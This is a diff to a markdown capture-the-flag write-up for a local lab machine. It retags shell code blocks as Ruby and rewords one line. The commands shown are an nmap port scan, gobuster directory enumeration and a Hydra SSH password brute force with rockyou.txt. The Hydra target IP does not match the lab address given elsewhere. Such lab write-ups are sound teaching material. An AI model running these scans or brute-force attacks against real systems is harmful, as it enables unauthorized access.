@@ -2,13 +2,13 @@
 
 ## Port Enumeration
 
-To begin our scan, we use the Nmap tool in our discovery phase. As we can see, we have the following open ports:
+To begin our scan, we use the Nmap tool  during our discovery phase. As we can see, we have the following open ports:
 
-```bash
+```ruby
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
 ```
 
-```bash
+```ruby
 ┌──(root㉿kali)-[/home/kali]
 └─# nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2  
 PORT   STATE SERVICE REASON
@@ -24,7 +24,7 @@ We access the web page hosted on the Apache server and find this:
 
 The first thing that comes to mind is to analyze the web page in search of strange links or any clues. As I don't find anything, I decide to investigate if there are hidden files or directories. For this, I'm going to use the Gobuster application.
 
-```shell
+```ruby
 gobuster dir -u http://172.17.0.2/ -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
 
 ```
@@ -46,7 +46,7 @@ Finally, everything points to the need for a brute force attack on the SSH servi
 
 For this, I'm going to use the Hydra tool
 
-```bash
+```ruby
 hydra -l borazuwarah -P rockyou.txt -t 10 -w 1 ssh://172.0.17.2
 ```
 
